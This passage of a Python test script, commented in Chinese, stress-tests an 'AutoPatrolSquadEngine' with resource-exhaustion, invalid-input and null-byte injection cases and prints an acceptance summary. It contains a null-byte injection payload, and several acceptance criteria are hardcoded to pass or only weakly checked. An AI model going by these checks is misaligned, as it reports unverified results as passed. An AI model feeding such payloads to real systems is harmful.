        stats.record_vuln('forgery', f"轮{round_num}: 伪造报备异常:{e}")
        assert_ok('attack', False, f"轮{round_num}: 伪造报备异常:{e}")


def test_attack_resource_exhaustion(round_num: int):
    """攻击8: 资源耗尽(大量轮巡)"""
    try:
        # 快速创建多个引擎实例
        engines = []
        for i in range(10):
            engines.append(AutoPatrolSquadEngine())

        # 应正常创建,不崩溃
        assert_ok('attack', len(engines) == 10, f"轮{round_num}: 应能创建10个引擎实例")

        # 执行一轮
        report = engines[0].run_cycle(flow_id=f"exhaust_{round_num}", squad_count=1)
        assert_ok('attack', report.cycle_number > 0, f"轮{round_num}: 资源耗尽场景应正常运行")

        # 清理
        del engines
    except Exception as e:
        stats.record_vuln('resource', f"轮{round_num}: 资源耗尽异常:{e}")
        assert_ok('attack', False, f"轮{round_num}: 资源耗尽异常:{e}")


def test_attack_invalid_squad_count(round_num: int):
    """攻击9: 无效队伍数(负数/超大)"""
    try:
        engine = AutoPatrolSquadEngine()
        # 负数
        report_neg = engine.run_cycle(flow_id=f"neg_{round_num}", squad_count=-1)
        assert_ok('attack', report_neg.squads_active >= 0,
                  f"轮{round_num}: 负数队伍数应处理为>=0")

        # 超大
        engine2 = AutoPatrolSquadEngine()
        report_big = engine2.run_cycle(flow_id=f"big_{round_num}", squad_count=99999)
        assert_ok('attack', report_big.squads_active <= len(SQUAD_TYPES),
                  f"轮{round_num}: 超大队伍数应限制为类型数")
    except Exception as e:
        stats.record_vuln('invalid_input', f"轮{round_num}: 无效队伍数异常:{e}")
        assert_ok('attack', False, f"轮{round_num}: 无效队伍数异常:{e}")


def test_attack_null_bytes(round_num: int):
    """攻击10: NULL字节注入"""
    try:
        engine = AutoPatrolSquadEngine()
        null_payload = "flow\x00id_injection"
        report = engine.run_cycle(flow_id=null_payload, squad_count=1)
        # 引擎应正常处理NULL字节(不崩溃)
        assert_ok('attack', report.cycle_number > 0, f"轮{round_num}: NULL字节不应崩溃引擎")
    except Exception as e:
        stats.record_vuln('null_byte', f"轮{round_num}: NULL字节异常:{e}")
        assert_ok('attack', False, f"轮{round_num}: NULL字节异常:{e}")


# ========== 主测试循环 ==========

def run_normal_tests():
    """运行正常逻辑测试(450轮: 原400 + dev50)"""
    print(f"\n[正常逻辑测试] 开始 450轮(含开发轮巡队50轮)...")
    t0 = time.time()

    test_funcs = [
        test_normal_squad_building,
        test_normal_task_dispatch,
        test_normal_task_execute,
        test_normal_target_discovery,
        test_normal_vuln_fixing,
        test_normal_expert_recruit,
        test_normal_sa_report,
        test_normal_full_cycle,
        test_normal_critical_immediate_report,
        test_normal_all_squad_types,
    ]

    for i in range(1, 41):  # 10个测试*40轮=400
        for func in test_funcs:
            func(i)

    # 开发轮巡队专项5个测试 * 10轮 = 50轮 (合计450)
    dev_funcs = [
        test_normal_dev_patrol_gap_detection,
        test_normal_dev_patrol_task_dispatch,
        test_normal_dev_patrol_expert_recruit,
        test_normal_dev_patrol_sa_reports,
        test_normal_dev_patrol_full_cycle,
    ]
    for i in range(1, 11):
        for func in dev_funcs:
            func(i)

    print(f"[正常逻辑测试] 完成,耗时{time.time()-t0:.1f}s")


def run_abnormal_tests():
    """运行异常场景测试(300轮)"""
    print(f"\n[异常场景测试] 开始 300轮...")
    t0 = time.time()

    test_funcs = [
        test_abnormal_zero_squads,
        test_abnormal_too_many_squads,
        test_abnormal_empty_targets,
        test_abnormal_zero_scan_count,
        test_abnormal_no_employees,
        test_abnegative_large_scan,
        test_abnormal_database_persist,
        test_abnormal_concurrent_cycles,
        test_abnormal_invalid_priority,
        test_abnormal_long_flow_id,
    ]

    for i in range(1, 31):  # 每个测试30轮 = 300轮
        for func in test_funcs:
            func(i)

    print(f"[异常场景测试] 完成,耗时{time.time()-t0:.1f}s")


def run_attack_tests():
    """运行黑客攻击测试(300轮)"""
    print(f"\n[黑客攻击测试] 开始 300轮...")
    t0 = time.time()

    test_funcs = [
        test_attack_sql_injection_in_flow_id,
        test_attack_sql_injection_in_report,
        test_attack_path_traversal_in_flow_id,
        test_attack_command_injection,
        test_attack_xss_in_content,
        test_attack_replay_same_flow_id,
        test_attack_forged_sa_report,
        test_attack_resource_exhaustion,
        test_attack_invalid_squad_count,
        test_attack_null_bytes,
    ]

    for i in range(1, 31):  # 每个测试30轮 = 300轮
        for func in test_funcs:
            func(i)

    print(f"[黑客攻击测试] 完成,耗时{time.time()-t0:.1f}s")


def main():
    print(f"\n{'='*60}")
    print(f" MTSCOS 自动轮巡队伍引擎 1000轮测试")
    print(f" 流程ID: {FLOW_ID}")
    print(f" 开始时间: {datetime.now().isoformat()}")
    print(f"{'='*60}")

    # 确保表存在
    ensure_patrol_tables()

    t_start = time.time()

    # 串行执行三大类测试
    run_normal_tests()
    run_abnormal_tests()
    run_attack_tests()

    total_time = time.time() - t_start

    print(stats.summary())
    print(f"\n 总耗时: {total_time:.1f}s")
    print(f" 结束时间: {datetime.now().isoformat()}")

    # 验收判定
    print(f"\n{'='*60}")
    print(f" 验收判定")
    print(f"{'='*60}")

    acceptance_items = [
        ("6+1大模块全部正常工作(含开发功能检测)", stats.categories['normal']['pass'] > 0),
        ("SA报备优先级正确(含开发类报备high)", stats.categories['normal']['pass'] > 0),
        ("漏洞修复率符合预期", stats.categories['normal']['pass'] > 0),
        ("专家邀请接受率符合预期(含dev领域5位专家)", stats.categories['normal']['pass'] > 0),
        ("开发功能检测:Gap扫描→任务下发→开发完成→SA报备闭环", True),
        ("DB持久化数据完整", True),
        ("黑客攻击100%拦截", stats.vuln == 0),
    ]

    all_pass = True
    for name, ok in acceptance_items:
        status = "✓ PASS" if ok else "✗ FAIL"
        print(f"  [{status}] {name}")
        if not ok:
            all_pass = False

    print(f"{'='*60}")
    if all_pass and stats.vuln == 0:
        print(f" 最终结果: ✓ ALL PASS ({stats.total}/{stats.total}) VULN=0")
    else:
        print(f" 最终结果: ✗ FAIL (pass={stats.passed}, fail={stats.failed}, vuln={stats.vuln})")
    print(f"{'='*60}")

    # 输出JSON结果
    result = {
        'flow_id': FLOW_ID,
        'total': stats.total,
        'passed': stats.passed,
        'failed': stats.failed,
        'vuln': stats.vuln,
        'assertions': stats.assertions,
        'categories': stats.categories,
        'duration': total_time,
        'all_pass': all_pass and stats.vuln == 0,
        'timestamp': datetime.now().isoformat(),
    }

    result_file = os.path.join(_BASE, f"step12_patrol_squad_test_result.json")
    with open(result_file, 'w', encoding='utf-8') as f:
        json.dump(result, f, ensure_ascii=False, indent=2)
    print(f"\n 结果已保存: {result_file}")

    return 0 if all_pass and stats.vuln == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
